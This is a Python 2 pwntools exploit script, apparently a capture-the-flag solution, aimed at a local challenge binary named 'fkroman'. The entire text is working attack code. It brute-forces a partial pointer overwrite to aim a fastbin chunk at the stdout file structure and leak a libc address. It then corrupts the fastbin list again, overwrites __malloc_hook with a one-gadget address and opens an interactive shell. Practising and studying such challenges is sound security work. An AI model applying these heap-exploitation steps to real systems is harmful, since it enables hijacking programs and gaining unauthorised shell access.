from pwn import *
context.log_level = 'debug'

def rv():
	p.recv()



def ru(data):
	p.recvuntil(data)



def sl(data):
	p.sendline(data)


def sd(data):
	p.send(data)


def add(idx,size):
	ru("choice: ")
	sl("1")
	rv()
	sl(str(idx))
	rv()
	sl(str(size))


def free(idx):
	ru("choice: ")
	sl("3")
	rv()
	sl(str(idx))


def edit(idx , size , data):
	ru("choice: ")
	sl("4")
	rv()
	sl(str(idx))
	rv()
	sl(str(size))
	rv()
	sd(data)

for i in range(100):
	try:
		p= process("./fkroman")
		add(0,0xa0)
		add(1,0x60)
		add(2,0x60)
		free(0)
		add(3,0x60)
		edit(3,2,"\xdd\x25")
		free(1)
		free(2)
		edit(2,1,"\x00")
		add(4,0x60)
		add(5,0x60)
		add(6,0x60)
		payload = "a"*3 +p64(0)*6 + p64(0xfbad1800) + p64(0)*3+"\x00"
		edit(6,len(payload) , payload)
		libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x7ffff7dd2600 + 0x00007ffff7a0d000
		#repair fastbin 
		free(4)
		edit(4,8,p64(libc_base -0x7ffff7a0d000+ 0x7ffff7dd1aed ))
		add(7,0x60)
		add(7,0x60)
		payload = "a"*3 + p64(0)*2+p64(libc_base + 0xf1147)
		gdb.attach(p)
		edit(7,len(payload),payload)
		add(9,0x20)
		p.interactive()
	except: 
		print i
